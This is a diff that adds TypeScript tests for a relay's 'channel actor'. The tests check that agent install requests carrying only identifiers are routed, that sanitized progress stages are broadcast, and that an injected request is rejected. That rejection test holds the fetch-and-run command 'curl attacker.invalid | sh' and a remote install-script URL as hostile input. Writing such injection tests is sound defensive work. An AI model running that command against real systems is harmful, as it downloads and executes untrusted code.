@@ -1,6 +1,8 @@
 import {
   AGENT_ACTIVITY_KIND,
   AGENT_CONTENT_KIND,
+  AGENT_INSTALL_PROGRESS_KIND,
+  AGENT_INSTALL_REQUEST_KIND,
   AGENT_MESSAGE_DELTA_KIND,
   type AgentActivityEvent,
   type AgentContentEvent,
@@ -9,6 +11,8 @@ import {
   decodeSessionFailedEvent,
   encodeAgentActivityEvent,
   encodeAgentContentEvent,
+  encodeAgentInstallProgressEvent,
+  encodeAgentInstallRequestCommand,
   encodeAgentMessageDeltaEvent,
   encodeSessionCancelCommand,
   encodeSessionCompletedEvent,
@@ -807,6 +811,99 @@ describe("channel actor", () => {
           images: [{ name: "preview.png" }],
         },
       ],
+    });
+  });
+
+  it("Given a registered Agent installation request, When Web sends only its request and Agent identifiers, Then the Relay routes it without interpreting a recipe", () => {
+    const peers = new MemoryPeers();
+    const actor = new ChannelActor(
+      "channel-1",
+      new MemoryTurnStore(),
+      peers,
+      new FixedClock(),
+    );
+    const host = new MemorySocket();
+    const observer = new MemorySocket();
+    const daemon = new MemorySocket();
+    peers.hostSockets.push(host, observer);
+    peers.daemonSockets.push(daemon);
+    const request = encodeAgentInstallRequestCommand({
+      agentId: "codex",
+      kind: AGENT_INSTALL_REQUEST_KIND,
+      protocolVersion: MOBIUS_PROTOCOL_VERSION,
+      requestId: "install-1",
+    });
+
+    actor.receiveHostMessage(host, request);
+
+    expect(daemon.messages).toEqual([request]);
+    expect(observer.messages).toEqual([request]);
+    expect(JSON.parse(request)).toEqual({
+      agentId: "codex",
+      kind: AGENT_INSTALL_REQUEST_KIND,
+      protocolVersion: MOBIUS_PROTOCOL_VERSION,
+      requestId: "install-1",
+    });
+  });
+
+  it("Given an installation request contains a remote URL or command, When it reaches the Relay boundary, Then strict decoding rejects it before daemon routing", () => {
+    const peers = new MemoryPeers();
+    const actor = new ChannelActor(
+      "channel-1",
+      new MemoryTurnStore(),
+      peers,
+      new FixedClock(),
+    );
+    const host = new MemorySocket();
+    const daemon = new MemorySocket();
+    peers.hostSockets.push(host);
+    peers.daemonSockets.push(daemon);
+
+    actor.receiveHostMessage(
+      host,
+      JSON.stringify({
+        agentId: "codex",
+        command: "curl attacker.invalid | sh",
+        kind: AGENT_INSTALL_REQUEST_KIND,
+        protocolVersion: MOBIUS_PROTOCOL_VERSION,
+        requestId: "install-injected",
+        url: "https://attacker.invalid/install.sh",
+      }),
+    );
+
+    expect(host.isOpen()).toBe(false);
+    expect(daemon.messages).toEqual([]);
+  });
+
+  it("Given a local installation is running, When the daemon reports sanitized progress, Then every browser receives only the bounded stage", () => {
+    const peers = new MemoryPeers();
+    const actor = new ChannelActor(
+      "channel-1",
+      new MemoryTurnStore(),
+      peers,
+      new FixedClock(),
+    );
+    const host = new MemorySocket();
+    const daemon = new MemorySocket();
+    peers.hostSockets.push(host);
+    peers.daemonSockets.push(daemon);
+    const progress = encodeAgentInstallProgressEvent({
+      agentId: "codex",
+      kind: AGENT_INSTALL_PROGRESS_KIND,
+      protocolVersion: MOBIUS_PROTOCOL_VERSION,
+      requestId: "install-1",
+      stage: "checking_acp",
+    });
+
+    actor.receiveDaemonMessage(daemon, progress);
+
+    expect(host.messages).toEqual([progress]);
+    expect(JSON.parse(progress)).toEqual({
+      agentId: "codex",
+      kind: AGENT_INSTALL_PROGRESS_KIND,
+      protocolVersion: MOBIUS_PROTOCOL_VERSION,
+      requestId: "install-1",
+      stage: "checking_acp",
     });
   });
 });
